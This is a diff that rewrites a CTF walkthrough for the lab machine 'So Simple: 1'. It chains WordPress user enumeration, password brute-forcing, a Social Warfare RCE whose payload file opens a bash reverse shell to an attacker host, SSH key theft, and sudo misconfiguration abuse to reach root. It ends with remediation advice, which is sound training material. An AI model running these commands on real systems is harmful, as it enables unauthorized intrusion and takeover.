@@ -1,178 +1,201 @@
 # So Simple: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.56.105 (host-only) |
-| **Difficulty** | Beginner |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.56.105 |
+| **Difficulty** | Easy/Medium |
 | **OS** | Linux |
-| **Root Flag** | /root/flag.txt |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/so-simple-1,515/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/so-simple1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → gobuster → WordPress → wpscan (user: max, plugin: Social Warfare) → brute (max:opensesame) → Social Warfare RCE → shell → SSH key → sudo service PATH traversal → writable script → root
+WordPress credential brute-force gives admin access; Social Warfare plugin RCE delivers a reverse shell; an exposed SSH private key enables lateral movement; two chained sudo misconfigurations escalate from `www-data` to `max` to `steven` to `root`.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. WordPress enumeration with wpscan
-3. Password brute force
-4. Social Warfare plugin RCE (CVE-2019-9978)
-5. Privilege escalation via sudo service + writable script
+1. Recon — arp-scan, nmap
+2. Enumeration — gobuster, wpscan, user and plugin discovery
+3. Exploitation — WordPress credential attack, Social Warfare RCE (CVE-2019-9978)
+4. Privilege Escalation — SSH key, sudo path traversal, writable sudo script
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
-
-```bash
-sudo arp-scan -l
-nmap -sV -sC -p- 192.168.56.105
-```
-
-Open ports: 22 (SSH), 80 (HTTP — WordPress).
-
-![Nmap scan](images/01-nmap.png)
-
----
-
-## Step 2: WordPress Enumeration
+Discover the target on the local subnet:
 
 ```bash
-gobuster dir -u http://192.168.56.105/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+arp-scan -l
 ```
-
-WordPress installation confirmed at `/`.
-
-Enumerate users and plugins:
 
 ```bash
-wpscan --url http://192.168.56.105/ -e u,ap --plugins-detection aggressive
+nmap -sV -sC -p- $TARGET
 ```
 
-Found: user **max**, plugin **Social Warfare 3.5.0** (vulnerable).
+![nmap scan](images/01-nmap.png)
 
-![wpscan results](images/02-wpscan.png)
+Open ports: **22** (SSH) and **80** (HTTP).
 
----
+## Step 2: Web Enumeration
 
-## Step 3: Password Brute Force
+Enumerate directories to locate the WordPress installation:
 
 ```bash
-wpscan --url http://192.168.56.105/ -U max -P /usr/share/wordlists/rockyou.txt
+gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
-Password found: **max : opensesame**
-
----
-
-## Step 4: Social Warfare Plugin RCE (CVE-2019-9978)
-
-Create a payload file on the attacker:
+WordPress is found. Enumerate users and plugins with wpscan:
 
 ```bash
-# payload.txt content:
-system("bash -c 'bash -i >& /dev/tcp/192.168.56.102/8080 0>&1'");
+wpscan --url http://$TARGET --enumerate u,vp
 ```
 
-Serve it:
+![wpscan](images/02-wpscan.png)
+
+User discovered: **max**. The Social Warfare plugin version **3.5.0** is installed.
+
+## Step 3: WordPress Password Brute-Force
+
+```bash
+wpscan --url http://$TARGET --username max --passwords /usr/share/wordlists/rockyou.txt
+```
+
+Credentials found: `max` / `opensesame`.
+
+## Step 4: Social Warfare RCE (CVE-2019-9978)
+
+Social Warfare 3.5.0 allows unauthenticated remote code execution via the debug endpoint. Create a payload file on the attacker:
+
+```bash
+cat > payload.txt << 'EOF'
+<pre>system('id')</pre>
+EOF
+```
+
+Host it:
 
 ```bash
 python3 -m http.server 80
 ```
 
-Start listener:
+Test execution by requesting the payload through the plugin:
 
 ```bash
-nc -lvnp 8080
+curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
 ```
 
-Trigger the RCE:
+The `id` output in the response confirms RCE as `www-data`.
 
-```
-GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.56.102/payload.txt
-```
-
-Shell received as `www-data`.
-
-![RCE shell](images/03-rce.png)
-
----
-
-## Step 5: Upgrade to SSH
-
-Find max's private key:
+Prepare a reverse shell payload:
 
 ```bash
+cat > payload.txt << 'EOF'
+<pre>system("bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'")</pre>
+EOF
+```
+
+Start the listener:
+
+```bash
+nc -lvnp $LPORT
+```
+
+Trigger it:
+
+```bash
+curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
+```
+
+![reverse shell](images/03-revshell.png)
+
+Reverse shell received as `www-data`.
+
+## Step 5: Lateral Movement to max via SSH Key
+
+Search the WordPress installation for sensitive files:
+
+```bash
+find /home/max -name "*.pub" -o -name "id_rsa" 2>/dev/null
 cat /home/max/.ssh/id_rsa
 ```
 
-Copy to attacker, set permissions, and SSH in:
+Copy the private key to the attacker machine and set permissions:
 
 ```bash
 chmod 600 max_id_rsa
-ssh -i max_id_rsa max@192.168.56.105
+ssh -i max_id_rsa max@$TARGET
 ```
 
----
+SSH session established as `max`.
 
-## Step 6: Privilege Escalation — sudo → steven → root
+## Step 6: Privilege Escalation — max to steven
+
+Check sudo permissions as max:
 
 ```bash
 sudo -l
-# User max may run: /usr/sbin/service as steven (NOPASSWD)
 ```
 
-Abuse `service` for PATH traversal to steven:
+max can run `/usr/sbin/service` as `steven` without a password. Exploit the path traversal in the service binary:
 
 ```bash
 sudo -u steven /usr/sbin/service ../../bin/bash
-id
-# uid=1001(steven)
 ```
 
-Check steven's sudo rights:
+Shell obtained as `steven`.
+
+![steven shell](images/04-steven-shell.png)
+
+## Step 7: Privilege Escalation — steven to root
+
+Check steven's sudo permissions:
 
 ```bash
 sudo -l
-# User steven may run: /opt/tools/server-health.sh as root (NOPASSWD)
 ```
 
-The script does not exist. Create it:
+steven can run `/opt/tools/server-health.sh` as root without a password, but the script does not exist yet. Create it:
 
 ```bash
 mkdir -p /opt/tools
 cat > /opt/tools/server-health.sh << 'EOF'
 #!/bin/bash
-bash
+/bin/bash
 EOF
 chmod +x /opt/tools/server-health.sh
-sudo /opt/tools/server-health.sh
-id
-# uid=0(root)
 ```
 
-![Privesc path](images/04-privesc.png)
+Execute it with sudo:
 
 ```bash
+sudo /opt/tools/server-health.sh
+```
+
+Root shell obtained.
+
+## Step 8: Root Flag
+
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
 cat /root/flag.txt
 ```
 
-![Root flag](images/05-root.png)
-
----
+![root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Social Warfare 3.5.0** has a pre-auth RCE via the `swp_debug` parameter — keep plugins updated
-2. **SSH keys readable by www-data** allow lateral movement even without the user's password
-3. **sudo service PATH traversal** (`../../bin/bash`) gives a shell as the target user
-4. **Missing sudo script** that any user can create = instant root escalation
+1. WordPress credential brute-force is practical when wpscan can enumerate usernames and the password policy is weak.
+2. Unpatched plugins with known CVEs (Social Warfare 3.5.0) provide unauthenticated RCE without any authentication bypass.
+3. Storing a user's SSH private key in a world-readable location within the WordPress directory allows lateral movement from the web server process to that user.
+4. A `sudo` entry for `/usr/sbin/service` can be abused for path traversal to spawn an arbitrary shell as the target user.
+5. Allowing a non-root user to run a non-existent script as root via `sudo` is equivalent to granting unrestricted root access.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Social Warfare RCE (CVE-2019-9978) | Upgrade plugin to ≥ 3.5.3 |
-| Readable SSH private key | `chmod 600 ~/.ssh/id_rsa`; never leave keys world-readable |
-| sudo service PATH traversal | Restrict `service` via AppArmor or use absolute paths in sudoers |
-| Missing sudo script writable by user | Pre-create scripts with root ownership; validate paths in sudoers |
+|---|---|
+| Weak WordPress password | Enforce strong passwords; use two-factor authentication on wp-admin |
+| Social Warfare 3.5.0 RCE | Update to a patched version (3.5.3+); keep all plugins current |
+| Exposed SSH private key | Store keys in `~/.ssh/` with mode 600; never place them in web-accessible paths |
+| Sudo path traversal via `service` | Restrict sudo to full absolute paths of specific commands; use `securepath` |
+| Writable sudo script path | Ensure sudo-allowed scripts exist and are owned by root with mode 755; never grant sudo to non-existent files |
